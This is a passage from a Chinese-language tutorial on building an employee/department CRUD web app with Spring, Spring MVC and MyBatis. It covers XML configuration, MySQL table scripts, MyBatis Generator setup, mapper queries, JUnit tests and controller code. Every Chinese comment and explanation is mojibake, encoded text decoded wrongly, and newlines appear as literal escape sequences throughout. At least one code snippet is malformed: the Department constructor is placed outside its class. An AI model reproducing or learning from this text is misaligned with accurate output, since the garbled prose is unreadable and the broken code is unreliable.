å¯åŠ¨ä¼˜å…ˆçº§ï¼Œæ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šå¤§ -->\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>springMVC</servlet-name>\n        <!-- å°†DispatcherServletè¯·æ±‚æ˜ å°„é…ç½®ä¸º\"/\"ï¼Œåˆ™Spring MVCå°†æ•è·Webå®¹å™¨æ‰€æœ‰çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬é™æ€èµ„æºçš„è¯·æ±‚ -->\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n\n    <!-- step3: characterEncodingFilterå­—ç¬¦ç¼–ç è¿‡æ»¤å™¨ï¼Œæ”¾åœ¨æ‰€æœ‰è¿‡æ»¤å™¨çš„å‰é¢ -->\n    <filter>\n        <filter-name>characterEncodingFilter</filter-name>\n        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n        <init-param>\n            <!--è¦ä½¿ç”¨çš„å­—ç¬¦é›†ï¼Œä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨UTF-8(ä¿é™©èµ·è§UTF-8æœ€å¥½)-->\n            <param-name>encoding</param-name>\n            <param-value>UTF-8</param-value>\n        </init-param>\n        <init-param>\n            <!--æ˜¯å¦å¼ºåˆ¶è®¾ç½®requestçš„ç¼–ç ä¸ºencodingï¼Œé»˜è®¤falseï¼Œä¸å»ºè®®æ›´æ”¹-->\n            <param-name>forceRequestEncoding</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <init-param>\n            <!--æ˜¯å¦å¼ºåˆ¶è®¾ç½®responseçš„ç¼–ç ä¸ºencodingï¼Œå»ºè®®è®¾ç½®ä¸ºtrue-->\n            <param-name>forceResponseEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n    <filter-mapping>\n        <filter-name>characterEncodingFilter</filter-name>\n        <!--è¿™é‡Œä¸èƒ½ç•™ç©ºæˆ–è€…ç›´æ¥å†™ ' / ' ï¼Œå¦åˆ™å¯èƒ½ä¸èµ·ä½œç”¨-->\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <!-- step4: é…ç½®è¿‡æ»¤å™¨ï¼Œå°†postè¯·æ±‚è½¬ä¸ºdeleteï¼Œput -->\n    <filter>\n        <filter-name>HiddenHttpMethodFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n    </filter>\n    <filter-mapping>\n        <filter-name>HiddenHttpMethodFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n</web-app>\n```\n\n#### d.é…ç½®springMVC.xml\n\n> Spring MVC çš„é…ç½®æ–‡ä»¶ï¼Œä¸»è¦åŒ…å«ç½‘ç«™è·³è½¬é€»è¾‘çš„æ§åˆ¶ã€é…ç½®ã€‚\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\">\n\n    <!-- step1: é…ç½®Controlleræ‰«ææ–¹å¼ -->\n    <!-- ä½¿ç”¨ç»„ä»¶æ‰«æçš„æ–¹å¼å¯ä»¥ä¸€æ¬¡æ‰«æå¤šä¸ªController,åªéœ€æŒ‡å®šåŒ…è·¯å¾„å³å¯ -->\n    <context:component-scan base-package=\"com.jianjian.crud\" use-default-filters=\"false\">\n        <!-- ä¸€èˆ¬åœ¨SpringMVCçš„é…ç½®é‡Œï¼Œåªæ‰«æControllerå±‚ï¼ŒSpringé…ç½®ä¸­æ‰«ææ‰€æœ‰åŒ…ï¼Œä½†æ˜¯æ’é™¤Controllerå±‚ã€‚\n        context:include-filterè¦æ³¨æ„ï¼Œå¦‚æœbase-packageæ‰«æçš„ä¸æ˜¯æœ€ç»ˆåŒ…ï¼Œé‚£ä¹ˆå…¶ä»–åŒ…è¿˜æ˜¯ä¼šæ‰«æã€åŠ è½½ï¼Œå¦‚æœåœ¨SpringMVCçš„é…ç½®ä¸­è¿™ä¹ˆåšï¼Œä¼šå¯¼è‡´Springä¸èƒ½å¤„ç†äº‹åŠ¡ï¼Œ\n        æ‰€ä»¥æ­¤æ—¶éœ€è¦åœ¨<context:component-scan>æ ‡ç­¾ä¸Šï¼Œå¢åŠ use-default-filters=\"false\"ï¼Œå°±æ˜¯çœŸçš„åªæ‰«æcontext:include-filteråŒ…æ‹¬çš„å†…å®¹-->\n        <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    </context:component-scan>\n\n    <!-- step2: æ ‡å‡†é…ç½® -->\n    <!-- å°† Spring MVC ä¸èƒ½å¤„ç†çš„è¯·æ±‚äº¤ç»™ tomcat å¤„ç† -->\n    <mvc:default-servlet-handler/>\n    <!-- ç®€åŒ–æ³¨è§£é…ç½®ï¼Œå¹¶æä¾›æ›´é«˜çº§çš„åŠŸèƒ½ -->\n    <!--èƒ½æ”¯æŒ Spring MVC æ›´é«˜çº§çš„ä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚ JSR 303 æ ¡éªŒã€å¿«æ·çš„ Ajax æ˜ å°„åŠ¨æ€è¯·æ±‚ç­‰-->\n    <mvc:annotation-driven />\n</beans>\n```\n\n#### e.é…ç½®applicationContext.xml\n\n> Spring çš„é…ç½®æ–‡ä»¶ï¼Œä¸»è¦é…ç½®ä¸šåŠ¡é€»è¾‘ç›¸å…³çš„å†…å®¹ï¼šæ•°æ®æºã€ä¸MyBatisçš„æ•´åˆã€äº‹åŠ¡æ§åˆ¶ç­‰ã€‚\n\nå…ˆåˆ›å»ºä¸€ä¸ª db.propertiesï¼Œç”¨æ¥ä¿å­˜æ•°æ®åº“é©±åŠ¨çš„é…ç½®ä¿¡æ¯\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud?useUnicode=true&characterEncoding=utf8\njdbc.username=root\njdbc.password=root\n```\n\napplicationContext.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd\">\n\n    <!-- step1: é…ç½®åŒ…æ‰«ææ–¹å¼ã€‚æ‰«ææ‰€æœ‰åŒ…ï¼Œä½†æ˜¯æ’é™¤Controllerå±‚ -->\n    <context:component-scan base-package=\"com.jianjian.crud\">\n        <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n    </context:component-scan>\n\n    <!-- step2: é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ -->\n    <!-- å¼•å…¥propertiesæ–‡ä»¶ -->\n    <context:property-placeholder location=\"classpath:db.properties\"/>\n    <!--æ•°æ®æºçš„é…ç½®-->\n    <bean id=\"pooledDataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n        <property name=\"driverClassName\" value=\"${jdbc.driver}\"/>\n        <property name=\"url\" value=\"${jdbc.url}\"/>\n        <property name=\"username\" value=\"${jdbc.username}\"/>\n        <property name=\"password\" value=\"${jdbc.password}\"/>\n    </bean>\n\n    <!-- step3: spring ä¸ mybatis æ•´åˆ -->\n    <!-- é…ç½®sqlSessionFactoryï¼Œéœ€è¦å¼•å…¥ mybatis-spring åŒ… -->\n    <bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n        <!-- åŠ è½½Mybatiså…¨å±€é…ç½®æ–‡ä»¶ -->\n        <property name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/>\n        <!-- æ•°æ®åº“è¿æ¥æ±  -->\n        <property name=\"dataSource\" ref=\"pooledDataSource\"/>\n        <!-- é…ç½®mapperæ–‡ä»¶ä½ç½®ï¼Œæ‰«ææ˜ å°„æ–‡ä»¶ -->\n        <property name=\"mapperLocations\" value=\"classpath:mappers/*.xml\"/>\n    </bean>\n\n    <!-- step4: é…ç½®æ‰¹é‡æ‰§è¡Œçš„sqlSession(å¯é€‰æ“ä½œ) -->\n    <bean id=\"sqlSession\" class=\"org.mybatis.spring.SqlSessionTemplate\">\n        <constructor-arg name=\"sqlSessionFactory\" ref=\"sqlSessionFactory\"/>\n        <constructor-arg name=\"executorType\" value=\"BATCH\"/>\n    </bean>\n\n    <!-- step5: é…ç½®mapperæ‰«æå™¨ï¼Œå°† MyBatis æ¥å£çš„å®ç°åŠ å…¥åˆ° IOC å®¹å™¨ä¸­ -->\n    <bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\">\n        <!--æ‰«ææ‰€æœ‰çš„ DAO æ¥å£çš„å®ç°ï¼ŒåŠ å…¥åˆ° IOC å®¹å™¨ä¸­-->\n        <property name=\"basePackage\" value=\"com.jianjian.crud.dao\"></property>\n        <property name=\"sqlSessionFactoryBeanName\" value=\"sqlSessionFactory\"/>\n    </bean>\n\n    <!-- step6: é…ç½®äº‹åŠ¡æ§åˆ¶ -->\n    <bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n        <!-- é…ç½®æ•°æ®æº -->\n        <property name=\"dataSource\" ref=\"pooledDataSource\"/>\n    </bean>\n\n    <!-- é…ç½®aop -->\n    <aop:config>\n        <!-- åˆ‡å…¥ç‚¹è¡¨è¾¾å¼ -->\n        <!-- ç¬¬ä¸€ä¸ª*è¡¨ç¤ºè¿”å›ä»»æ„ç±»å‹ï¼Œç¬¬äºŒä¸ª*è¡¨ç¤ºä»»æ„æ–¹æ³•ï¼Œ..serviceä¸‹ä»»æ„å­åŒ…ï¼Œï¼ˆ..ï¼‰è¡¨ç¤ºä»»æ„æ•°é‡å’Œç±»å‹çš„å‚æ•°-->\n        <aop:pointcut id=\"txPoint\" expression=\"execution(* com.jianjian.crud.service..*(..))\"/>\n        <!-- é…ç½®äº‹åŠ¡å¢å¼ºï¼ŒæŒ‡å®šåˆ‡ç‚¹è¡¨è¾¾å¼-->\n        <aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPoint\"/>\n    </aop:config>\n\n    <!-- é…ç½®äº‹åŠ¡å¢å¼ºï¼Œäº‹åŠ¡å¦‚ä½•å¢å¼º-->\n    <tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\n        <tx:attributes>\n            <!-- * ä»£è¡¨æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯äº‹åŠ¡æ–¹æ³•-->\n            <tx:method name=\"*\"/>\n            <!-- get* ä»£è¡¨ä»¥getå¼€å§‹çš„æ‰€æœ‰æ–¹æ³•-->\n            <tx:method name=\"get*\" read-only=\"true\"/>\n        </tx:attributes>\n    </tx:advice>\n</beans>\n```\n\n#### f.é…ç½®mybatis-config.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n\n    <settings>\n        <!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°-->\n        <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n        <!--å¼€å¯å»¶è¿ŸåŠ è½½-->\n        <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n    </settings>\n    <!--è®¾ç½®åˆ«å-->\n    <typeAliases>\n        <package name=\"com.jianjian.crud.bean\"/>\n    </typeAliases>\n    <!-- ä½¿ç”¨åˆ†é¡µæ’ä»¶ -->\n    <plugins>\n        <plugin interceptor=\"com.github.pagehelper.PageInterceptor\">\n            <!--åˆ†é¡µå‚æ•°åˆç†åŒ–  -->\n            <property name=\"reasonable\" value=\"true\"/>\n        </plugin>\n    </plugins>\n    \n</configuration>\n```\n\n#### g.åˆ›å»ºæ•°æ®åº“è¡¨\n\nå…ˆåˆ›å»ºåä¸º ssm_crud çš„æ•°æ®åº“ï¼Œå†åˆ›å»ºå‘˜å·¥è¡¨ tb_emp å’Œéƒ¨é—¨è¡¨ tb_dept\n\n```sql\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tb_dept\n-- ----------------------------\nDROP TABLE IF EXISTS `tb_dept`;\nCREATE TABLE `tb_dept` (\n  `dept_id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'éƒ¨é—¨ç¼–å·',\n  `dept_name` varchar(100) NOT NULL COMMENT 'éƒ¨é—¨åç§°',\n  PRIMARY KEY (`dept_id`) USING BTREE,\n  UNIQUE KEY `uq_dept_name` (`dept_name`) USING BTREE\n) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;\n\n-- ----------------------------\n-- Records of tb_dept\n-- ----------------------------\nBEGIN;\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (4, 'äººäº‹éƒ¨');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (1, 'å¼€å‘éƒ¨');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (2, 'æµ‹è¯•éƒ¨');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (3, 'è®¾è®¡éƒ¨');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for tb_emp\n-- ----------------------------\nDROP TABLE IF EXISTS `tb_emp`;\nCREATE TABLE `tb_emp` (\n  `emp_id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'å‘˜å·¥ç¼–å·',\n  `emp_name` varchar(15) NOT NULL COMMENT 'å‘˜å·¥å§“å',\n  `gender` int(4) DEFAULT NULL COMMENT 'å‘˜å·¥æ€§åˆ«, 1ç”·2å¥³',\n  `email` varchar(255) DEFAULT NULL COMMENT 'å‘˜å·¥é‚®ç®±',\n  `d_id` int(11) DEFAULT NULL COMMENT 'éƒ¨é—¨ç¼–å·',\n  PRIMARY KEY (`emp_id`) USING BTREE,\n  KEY `fk_emp_dept` (`d_id`) USING BTREE,\n  KEY `uq_emp_name` (`emp_name`) USING BTREE,\n  CONSTRAINT `fk_emp_dept` FOREIGN KEY (`d_id`) REFERENCES `tb_dept` (`dept_id`)\n) ENGINE=InnoDB AUTO_INCREMENT=68 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;\n\n```\n\n### 2.é€†å‘å·¥ç¨‹\n\n#### a.é…ç½®æ–‡ä»¶\n\nsrc/main/resources/mbg.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\">\n<generatorConfiguration>\n    <context id=\"DB2Tables\" targetRuntime=\"MyBatis3\">\n        <!-- æ¸…é™¤æ³¨é‡Šä¿¡æ¯ -->\n        <commentGenerator>\n            <property name=\"suppressAllComments\" value=\"true\" />\n        </commentGenerator>\n\n        <!-- step1: é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ -->\n        <jdbcConnection driverClass=\"com.mysql.cj.jdbc.Driver\"\n                        connectionURL=\"jdbc:mysql://localhost:3306/ssm_crud\"\n                        userId=\"root\"\n                        password=\"root\">\n        </jdbcConnection>\n\n        <javaTypeResolver>\n            <property name=\"forceBigDecimals\" value=\"false\"/>\n        </javaTypeResolver>\n\n\n        <!-- step2: javaBeançš„ç”Ÿæˆç­–ç•¥-->\n        <javaModelGenerator targetPackage=\"com.jianjian.crud.bean\"\n                            targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n            <property name=\"trimStrings\" value=\"true\" />\n        </javaModelGenerator>\n\n        <!-- step3ï¼šSQLæ˜ å°„æ–‡ä»¶çš„ç”Ÿæˆç­–ç•¥ -->\n        <sqlMapGenerator targetPackage=\"mapper\"\n                         targetProject=\"./src/main/resources\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </sqlMapGenerator>\n\n        <!-- step4: Mapperæ¥å£çš„ç”Ÿæˆç­–ç•¥ -->\n        <javaClientGenerator type=\"XMLMAPPER\"\n                             targetPackage=\"com.jianjian.crud.mapper\"\n                             targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </javaClientGenerator>\n\n        <!-- step5: æŒ‡å®šè¡¨çš„ç”Ÿæˆç­–ç•¥ -->\n        <table tableName=\"tb_emp\" domainObjectName=\"Employee\"/>\n        <table tableName=\"tb_dept\" domainObjectName=\"Department\"/>\n    </context>\n</generatorConfiguration>\n```\n\n#### b.ç”Ÿæˆé€†å‘æ–‡ä»¶\n\n```java\npublic class MBGTest {\n    public static void main(String[] args) throws Exception {\n        List<String> warnings = new ArrayList<>();\n        boolean overwrite = true;\n        File configFile = new File(\"src/main/resources/mbg.xml\");\n        ConfigurationParser cp = new ConfigurationParser(warnings);\n        Configuration config = cp.parseConfiguration(configFile);\n        DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n        MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n        myBatisGenerator.generate(null);\n    }\n}\n```\n\n#### c.ä¿®æ”¹é€†å‘æ–‡ä»¶\n\nä¿®æ”¹ Employee ç±»ï¼Œæ·»åŠ éƒ¨é—¨å±æ€§å’Œæ„é€ æ–¹æ³•\n\n```java\n//å¸Œæœ›æŸ¥è¯¢å‘˜å·¥çš„åŒæ—¶ï¼Œä¹ŸæŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\nprivate Department department;\n//ä¸ºäº†ç»™è¡¨æ’å…¥æ•°æ®ï¼Œéœ€è¦æä¾›ä¸€ä¸ªä¸å¸¦éƒ¨é—¨çš„æ„é€ å™¨\npublic Employee(Integer empId, String empName, Integer gender, String email, Integer dId) {\n  this.empId = empId;\n  this.empName = empName;\n  this.gender = gender;\n  this.email = email;\n  this.dId = dId;\n}\npublic Employee() {\n}\n```\n\nä¿®æ”¹ Department ç±»ï¼Œæ·»åŠ æ„é€ æ–¹æ³•\n\n```java\npublic class Department {\n    private Integer deptId;\n    private String deptName;\n}\npublic Department() {\n}\n```\n\nä¿®æ”¹ EmployeeMapper æ¥å£\n\n```java\npublic interface EmployeeMapper {\n\t......\n        \n    List<Employee> selectByExampleWithDept(EmployeeExample example);\n\n    Employee selectByPrimaryKeyWithDept(Integer empId);\n    \n\t......\n}\n```\n\nä¿®æ”¹ EmployeeMapper.xml\n\n```xml\n  <!--æ–°å¢çš„å¸¦æœ‰éƒ¨é—¨ä¿¡æ¯çš„è¿”å›ç»“æœé›†-->\n  <resultMap id=\"WithDeptResultMap\" type=\"com.jianjian.crud.bean.Employee\">\n    <id column=\"emp_id\" jdbcType=\"INTEGER\" property=\"empId\" />\n    <result column=\"emp_name\" jdbcType=\"VARCHAR\" property=\"empName\" />\n    <result column=\"gender\" jdbcType=\"INTEGER\" property=\"gender\" />\n    <result column=\"email\" jdbcType=\"VARCHAR\" property=\"email\" />\n    <result column=\"d_id\" jdbcType=\"INTEGER\" property=\"dId\" />\n    <association property=\"department\" javaType=\"com.jianjian.crud.bean.Department\">\n      <id column=\"dept_id\" property=\"deptId\"/>\n      <result column=\"dept_name\" property=\"deptName\"/>\n    </association>\n  </resultMap>\n\n\t<!--å¸¦éƒ¨é—¨åˆ—çš„sql-->\n  <sql id=\"WithDept_Column_List\">\n    e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name\n  </sql>\n\n  <!--æ–°å¢çš„å¸¦éƒ¨é—¨æŸ¥è¯¢-->\n  <select id=\"selectByExampleWithDept\" parameterType=\"com.jianjian.crud.bean.EmployeeExample\" resultMap=\"WithDeptResultMap\">\n    select\n    <if test=\"distinct\">\n      distinct\n    </if>\n    <include refid=\"WithDept_Column_List\" />\n    from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n    <if test=\"_parameter != null\">\n      <include refid=\"Example_Where_Clause\" />\n    </if>\n    <if test=\"orderByClause != null\">\n      order by ${orderByClause}\n    </if>\n  </select>\n  <select id=\"selectByPrimaryKeyWithDept\" parameterType=\"java.lang.Integer\" resultMap=\"WithDeptResultMap\">\n    select\n    <include refid=\"WithDept_Column_List\" />\n    from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n    where emp_id = #{empId,jdbcType=INTEGER}\n  </select>\n```\n\n#### d.æµ‹è¯•Mapper\n\nSpring æ•´åˆ Junit 5 æµ‹è¯• Mapper æ·»åŠ æ•°æ®\n\n```java\n@SpringJUnitConfig(locations = \"classpath:applicationContext.xml\")\npublic class MapperTest {\n\n    @Autowired\n    DepartmentMapper departmentMapper;\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n    @Autowired\n    SqlSession sqlSession;\n\n    @Test\n    public void testDept() {\n        //æ–°å¢éƒ¨é—¨ä¿¡æ¯\n        departmentMapper.insertSelective(new Department(null, \"ç®€ç®€éƒ¨\"));\n    }\n\n    @Test\n    public void testEmp() {\n        //æ’å…¥ä¸€æ¡å‘˜å·¥æ•°æ®\n        employeeMapper.insertSelective(new Employee(null, \"å¼ ä¸‰\", 1, \"zhangsan@qq.com\", 1));\n        employeeMapper.insertSelective(new Employee(null, \"æå››\", 1, \"lisi@163.com\", 1));\n        \n    }\n    @Test\n    public void testBatchEmp() {\n        //æ‰¹é‡æ’å…¥å‘˜å·¥æ•°æ®\n        EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n        for (int i = 0; i < 100; i++) {\n            String uid = UUID.randomUUID().toString().substring(0, 5) + i;\n            mapper.insertSelective(new Employee(null, uid, 2, uid + \"@gmail.com\", 2));\n        }\n    }\n}\n```\n\n### 3.æŸ¥è¯¢æ•°æ®\n\n- Controller æ˜¯ä¸ºå‰ç«¯æä¾›çš„è®¿é—®å…¥å£ï¼Œä¸ç”¨å…³å¿ƒå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚å…·ä½“çš„ä¸šåŠ¡é€»è¾‘æ”¾åœ¨äº† ServiceImplé‡Œï¼ŒController åªéœ€è°ƒç”¨å®ƒå°è£…å¥½çš„æ–¹æ³•å³å¯ã€‚\n- Service æä¾›ä¸šåŠ¡é€»è¾‘è¦ç”¨åˆ°çš„æ–¹æ³•ï¼ŒServiceImpl æä¾›æ–¹æ³•çš„å…·ä½“å®ç°ã€‚å³ï¼ŒServiceImpl è´Ÿè´£äº†ä¸»è¦çš„åŠŸèƒ½ç¼–å†™ï¼ŒController æä¾›äº†ä½¿ç”¨çš„å…¥å£ã€‚\n- Mapper ä¸º ServiceImpl æä¾›æ“ä½œæ•°æ®çš„æ–¹æ³•ï¼Œä½†æ–¹æ³•çš„å…·ä½“å®ç°(ä¹Ÿå°±æ˜¯SQLè¯­å¥)æ”¾åœ¨äº†mapperä¸‹çš„xmlæ–‡ä»¶é‡Œã€‚\n\n\n\n#### Service\n\n```java\npublic interface EmployeeService {\n    List<Employee> getAll();\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n    \n    @Autowired\n    EmployeeMapper employeeMapper;\n\n    @Override\n    public List<Employee> getAll() {\n        return employeeMapper.selectByExampleWithDept(null);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    \n    @Autowired\n    EmployeeService employeeService;\n\n     /**\n     * åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰å‘˜å·¥\n     */\n    @RequestMapping(value = \"/employees\", method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getEmpsWithJson(@RequestParam(value = \"pageNum\", defaultValue = \"1\") Integer pageNum,@RequestParam(value = \"pageSize\", defaultValue = \"5\") Integer pageSize) {\n        //å‚æ•°pageNumæ˜¯é¡µç å€¼   å‚æ•°pageSize ä»£è¡¨æ˜¯æ¯é¡µæ˜¾ç¤ºæ¡æ•°\n        PageHelper.startPage(pageNum, pageSize);\n        List<Employee> emps = employeeService.getAll();\n        //ç”¨PageInfoå¯¹ç»“æœè¿›è¡ŒåŒ…è£… ï¼ŒnavigatePages å¯¼èˆªé¡µå·\n        PageInfo page = new PageInfo(emps, 4);\n        return Msg.success().add(\"pageInfo\", page);\n    }\n\n}\n```\n\næ·»åŠ  Msg ç±»å¼•å…¥é“¾å¼ç¼–ç¨‹\n\n```java\npackage com.jianjian.crud.bean;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n//é€šç”¨çš„ç”¨æ¥è¿”å›JSONæ•°æ®çš„ç±»\npublic class Msg {\n\n    private int code;//çŠ¶æ€ç  100æˆåŠŸ 200å¤±è´¥\n    private String msg;//ç”¨æˆ·è¿”å›ç»™æµè§ˆå™¨çš„æ•°æ®\n    private Map<String, Object> data = new HashMap<>();//ç”¨æˆ·è¿”å›ç»™æµè§ˆå™¨çš„æ•°æ®\n\n    public static Msg success() {\n        Msg result = new Msg();\n        result.setCode(100);\n        result.setMsg(\"å¤„ç†æˆåŠŸ\");\n        return result;\n    }\n\n    public static Msg fail() {\n        Msg result = new Msg();\n        result.setCode(200);\n        result.setMsg(\"å¤„ç†å¤±è´¥\");\n        return result;\n    }\n\n    //é“¾å¼ç¼–ç¨‹\n    public Msg add(String key, Object value) {\n        this.getData().put(key, value);\n        return this;\n    }\n\n    public int getCode() {\n        return code;\n    }\n\n    public void setCode(int code) {\n        this.code = code;\n    }\n\n    public String getMsg() {\n        return msg;\n    }\n\n    public void setMsg(String msg) {\n        this.msg = msg;\n    }\n\n    public Map<String, Object> getData() {\n        return data;\n    }\n\n    public void setData(Map<String, Object> data) {\n        this.data = data;\n    }\n}\n```\n\nï»¿\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n  List<Employee> selectByExampleWithDept(EmployeeExample example);\n}\n```\n\n```xml\n  <!--å¸¦éƒ¨é—¨æŸ¥è¯¢-->\n<select id=\"selectByExampleWithDept\" parameterType=\"com.jianjian.crud.bean.EmployeeExample\" resultMap=\"WithDeptResultMap\">\n  select\n  <if test=\"distinct\">\n    distinct\n  </if>\n  <include refid=\"WithDept_Column_List\" />\n  from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n  <if test=\"_parameter != null\">\n    <include refid=\"Example_Where_Clause\" />\n  </if>\n  <if test=\"orderByClause != null\">\n    order by ${orderByClause}\n  </if>\n</select>\n\n<!--å¸¦éƒ¨é—¨åˆ—çš„sql-->\n<sql id=\"WithDept_Column_List\">\n  e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name\n</sql>\n```\n\n#### MVCTest\n\n```java\n@WebAppConfiguration\n@SpringJUnitConfig(locations = {\"classpath:applicationContext.xml\", \"classpath:springMVC.xml\"})\npublic class MVCTest {\n\n    //ä¼ å…¥MVCçš„IOCå®¹å™¨\n    @Autowired\n    WebApplicationContext context;\n\n    //è™šæ‹ŸMVCè¯·æ±‚ï¼Œè·å–å¤„ç†ç»“æœ\n    MockMvc mockMvc;\n\n    @BeforeEach\n    public void initMokcMvc() {\n        mockMvc = MockMvcBuilders.webAppContextSetup(context).build();\n    }\n\n    @Test\n    public void testPage() throws Exception {\n        //æ¨¡æ‹Ÿè¯·æ±‚æ‹¿åˆ°è¿”å›å€¼\n        MvcResult result = mockMvc.perform(MockMvcRequestBuilders.get(\"/employees\").param(\"pageNum\", \"1\").param(\"pageSize\",\"5\")).andReturn();\n        MockHttpServletRequest request = result.getRequest();\n        System.out.println(\"è¯·æ±‚\"+request);\n\n    }\n\n}\n```\n\n### 4.ä¿®æ”¹æ•°æ®\n\n- ç‚¹å‡»ç¼–è¾‘æŒ‰é’®ï¼Œå¼¹å‡ºç”¨æˆ·ä¿®æ”¹çš„å¯¹è¯æ¡†ã€‚\n- å¯¹è¯æ¡†å¯ä»¥å›æ˜¾ç”¨æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬éƒ¨é—¨ä¿¡æ¯ã€‚\n- ç‚¹å‡»ç¡®å®šï¼Œå®Œæˆä¿®æ”¹æ“ä½œã€‚\n\n#### Service\n\n```java\npublic interface EmployeeService {\n    ......\n\n    Employee getEmp(Integer empId);\n  \n \t\tvoid updateEmp(Employee employee);\n\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n\t\t......\n\n    @Override\n    public Employee getEmp(Integer empId) {\n        return employeeMapper.selectByPrimaryKey(empId);\n    }\n  \n    @Override\n    public void updateEmp(Employee employee) {\n        employeeMapper.updateByPrimaryKey(employee);\n    }\n}\n```\n\n```java\npublic interface DepartmentService {\n    List<Department> getAllDept();\n}\n```\n\n```java\n@Service\npublic class DepartmentServiceImpl implements DepartmentService {\n    @Autowired\n    DepartmentMapper departmentMapper;\n    @Override\n    public List<Department> 